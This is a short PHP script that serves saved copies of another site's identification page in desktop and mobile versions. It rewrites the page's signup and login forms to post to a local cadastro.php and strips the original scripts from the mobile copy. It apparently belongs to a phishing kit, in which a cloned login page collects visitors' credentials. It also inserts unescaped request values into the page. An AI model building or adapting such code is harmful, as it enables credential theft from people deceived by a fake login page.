<?php
include("../conexao.php");
include("../banco.php");
switch($dist) {
    case "desktop":
        $conteudo = file_get_contents('../dist/desktop/identificacao.html');
        $s1 = str_replace('<form class="SignupBox-form" data-reactid=".0.1.0.$main.1.0.0.1">', '<form class="SignupBox-form" action="cadastro.php?id=' . $id . '&itulo=' . $nomelink . '&dist=' . $dist . '" method="post">', $conteudo);
        $s2 = str_replace('<form id="LoginBox-form" class="LoginBox-form" data-reactid=".0.1.0.$main.1.1.0.2.1">', '<form id="LoginBox-form" class="LoginBox-form" action="cadastro.php?id=' . $id . '&itulo=' . $nomelink . '&dist=' . $dist . '" method="post">', $s1);
        echo $s2;
        break;
    case "mobile":
        $conteudom = file_get_contents('../dist/mobile/identificacao.html');
        $removescript = preg_replace("/((<script(.*?)?>)(.*?)(\/script>))/sim", "", $conteudom);
        $s1 = str_replace('"cadastro.php"', '"cadastro.php?id='.$id.'&titulo='.$nomelink.'&dist='.$dist.'"',$removescript);
        echo $s1;
        break;
};